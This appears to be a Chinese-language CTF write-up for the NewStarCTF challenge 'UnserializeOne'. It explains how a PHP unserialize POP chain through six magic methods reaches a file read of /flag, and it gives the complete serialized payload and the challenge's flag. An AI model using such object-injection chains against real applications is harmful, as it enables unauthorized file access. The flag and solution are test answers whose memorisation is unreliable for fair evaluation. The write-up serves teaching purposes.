---
date: 2026-11-03 19:05:00
slug: newstarctf-unserializeone
categories:
  - PHP
  - 反序列化
  - 代码审计
---

# [NewStarCTF] UnserializeOne — 五个魔术方法串成一条链

> **题目类型**：PHP 反序列化 — POP 链构造（魔术方法连环触发）
>
> **Flag**：`CTF2{a3ae15bd-2047-4dd5-b9b3-c0dccb22c632}`

---

## 题目概述

给一份源码，入口就一句：

```php
if(isset($_POST['pop'])){
    unserialize($_POST['pop']);
}
```

**四个类：`Start`、`Sec`、`Easy`、`eeee`，各带魔术方法。任务是拼一条从 `unserialize` 走到 `file_get_contents('/flag')` 的链。**

---

## 解题过程

### Step 1：先找终点——flag 在哪被读出来

```php
class Sec{
    public function __invoke()
    {
        echo file_get_contents('/flag');
    }
}
```

**终点在 `Sec::__invoke()`。**

**`__invoke` 的触发条件：**把一个对象当成函数来调用**，也就是 `$obj()`。**

### Step 2：谁会把对象当函数调用

```php
class Start{
    public function __isset($var)
    {
        ($this->func)();
    }
}
```

**`($this->func)()` —— 这就是“把 `$this->func` 当函数调用”。只要 `$this->func` 是一个 `Sec` 对象，就会走到 `Sec::__invoke`。**

**所以现在要找：**`__isset` 怎么被触发**。**

**`__isset` 的触发条件：**对不可访问或不存在的属性调用 `isset()`（或 `empty()`）**。**

### Step 3：谁会对不存在的属性调用 isset

```php
class eeee{
    public $obj;
    public function __clone()
    {
        if(isset($this->obj->cmd)){
            echo "success";
        }
    }
}
```

**`isset($this->obj->cmd)` —— 如果 `$this->obj` 是个 `Start` 对象，而 `Start` 里没有 `cmd` 这个属性，**这就是“对不存在的属性调用 isset”**，正好触发 `Start::__isset`。**

**所以 `eeee->obj` 要指向一个 `Start`，而那个 Start 的 `func` 要指向一个 `Sec`。**

**下一个问题：`__clone` 怎么触发？**

### Step 4：谁在 clone 对象

```php
class Easy{
    public $cla;
    public function __call($fun, $var)
    {
        $this->cla = clone $var[0];
    }
}
```

**`clone $var[0]` —— 直接触发被 clone 对象的 `__clone`。**

**`__call` 的触发条件：**调用了对象上不存在的方法**。**

### Step 5：谁调用了不存在的方法

```php
class Sec{
    public function __toString()
    {
        $this->obj->check($this->var);
        return "CTFers";
    }
}
```

**`$this->obj->check($this->var)` —— `check` 这个方法四个类里都没有，所以只要 `$this->obj` 是 `Easy`，就会触发 `Easy::__call`，**而且第一个参数正好是 `$this->var`**（也就是我们要 clone 的那个 `eeee` 对象）。**

**`__toString` 的触发条件：**对象被当成字符串使用**。**

### Step 6：谁把对象当字符串用了

```php
class Start{
    public function __destruct()
    {
        echo "Welcome to NewStarCTF, ".$this->name;
    }
}
```

**字符串拼接 `"..." . $this->name` —— 如果 `$this->name` 是个 `Sec` 对象，就会触发 `Sec::__toString`。**

**而 `__destruct` 是**对象被销毁时自动调用**——反序列化出来的对象在脚本结束时都会析构，所以这里是天然的起点。**

---

## 完整链条

```text
unserialize 结束、脚本运行完毕
  → Start::__destruct()            对象销毁自动触发
    → 字符串拼接 $this->name
      → Sec::__toString()          对象被当字符串用
        → $this->obj->check(...)   调用不存在的方法
          → Easy::__call()         不存在的方法被调用
            → clone $var[0]        克隆对象
              → eeee::__clone()    对象被 clone
                → isset($this->obj->cmd)   不存在的属性
                  → Start::__isset()       对不存在的属性 isset
                    → ($this->func)()      对象当函数调用
                      → Sec::__invoke()    对象当函数
                        → file_get_contents('/flag')
```

**五个魔术方法，一层扣一层，最后落在读文件上。**

---

## Payload

```text
O:5:"Start":2:{
  s:4:"name";O:3:"Sec":2:{
    s:3:"obj";O:4:"Easy":1:{s:3:"cla";N;}
    s:3:"var";O:4:"eeee":1:{
      s:3:"obj";O:5:"Start":2:{
        s:4:"name";N;
        s:4:"func";O:3:"Sec":2:{s:3:"obj";N;s:3:"var";N;}
      }
    }
  }
  s:4:"func";N;
}
```

**压成一行：**

```text
O:5:"Start":2:{s:4:"name";O:3:"Sec":2:{s:3:"obj";O:4:"Easy":1:{s:3:"cla";N;}s:3:"var";O:4:"eeee":1:{s:3:"obj";O:5:"Start":2:{s:4:"name";N;s:4:"func";O:3:"Sec":2:{s:3:"obj";N;s:3:"var";N;}}}}s:4:"func";N;}
```

**POST 参数名 `pop`，值就是上面那串。**

### 这个 payload 的结构对照

```
外层 Start
  name → Sec          ← __destruct 拼字符串时触发 __toString
    obj  → Easy       ← __toString 里调 check()，触发 __call
    var  → eeee       ← __call 里 clone 的第一个参数
             obj → Start   ← __clone 里 isset($obj->cmd)，触发 __isset
                     func → Sec   ← __isset 里 ($this->func)()，触发 __invoke
  func → N            ← 外层 Start 自己的 func，用不到，给 null 即可
```

---

## 解题思路总结

```text
从能读 flag 的地方倒推：
  file_get_contents  → Sec::__invoke
    ← 谁把对象当函数调用？  Start::__isset 的 ($this->func)()
      ← 谁触发 __isset？    eeee::__clone 的 isset($this->obj->cmd)
        ← 谁触发 __clone？  Easy::__call 的 clone $var[0]
          ← 谁触发 __call？ Sec::__toString 的 $this->obj->check()
            ← 谁触发 __toString？ Start::__destruct 的字符串拼接
```

**每一步都在问同一个问题：**要走到下一步，得先满足什么条件？**——然后去别的类里找满足这个条件的地方。**

### 漏洞原理

**① 魔术方法 = 自动触发的“钩子”**

**PHP 在很多操作上埋了钩子：对象销毁、被当字符串、被当函数、访问不存在的属性、调用不存在的方法、被 clone……开发者通常不知道这些钩子会在什么时候被调用。**

**② 只要链上每一环的属性都可控，就能拼出一条执行路径**

**`unserialize` 允许攻击者指定属性的**类型和内容**——一个字符串可以变成对象、对象可以变成另一个类的对象。于是本来毫无关系的四个类，被拼成了一条完整的调用链。**

**这就是 POP 链（Property-Oriented Programming）：**不执行代码，只摆对象，让程序自己走过去。**

**③ 最终的 sink 是 `file_get_contents('/flag')`**

**链子本身不做坏事，它只是把执行流送到那个能读文件的方法里。**

### 关键知识点

| 魔术方法 | 触发条件 |
|---|---|
| `__destruct()` | 对象被销毁（脚本结束时自动调用） |
| `__toString()` | 对象被当成字符串使用（拼接、echo、比较） |
| `__call($name,$args)` | 调用了**不存在**的方法 |
| `__clone()` | 对象被 `clone` 时 |
| `__isset($name)` | 对**不存在/不可访问**的属性调用 `isset()` 或 `empty()` |
| `__invoke()` | 对象被当成函数调用，如 `$obj()` |

---

??? note "属性可见性：protected / private 的写法不一样"

    **本题源码里四个类的属性在页面截图上都是 `public`，所以直接写属性名就行。**

    **但如果遇到 `protected` 或 `private`，序列化串里的名字要带前缀，而且**长度要把前缀算进去**：**

    ```text
    public     s:4:"name";          直接写名字
    protected  s:7:"\0*\0name";     前面是 \0 + * + \0，共 3 字节前缀
    private    s:10:"\0Sec\0name";  前面是 \0 + 类名 + \0
    ```

    **本地构造时要按目标类的真实可见性来写**，否则反序列化出来的属性是“同名但不是同一个”，魔术方法里读到的会是你没设置的那个。

??? note "这题踩的坑"

    **① 起点不要从某个类硬找**

    这题的起点是 `__destruct`——它不需要任何操作就会触发，所以**从“谁最先被自动调用”往回推，比从入口 `unserialize` 正着推更快**。

    **② 把它当成“倒推题”而不是“写代码题”**

    链子上每一环的答案都藏在别的类里，**不需要写新代码，只需要摆对象**。

    **③ 本地搭一份再改**

    把四个类复制到本地 PHP 里，用 `serialize()` 生成基础串，再对着改属性——比自己手数括号可靠得多。
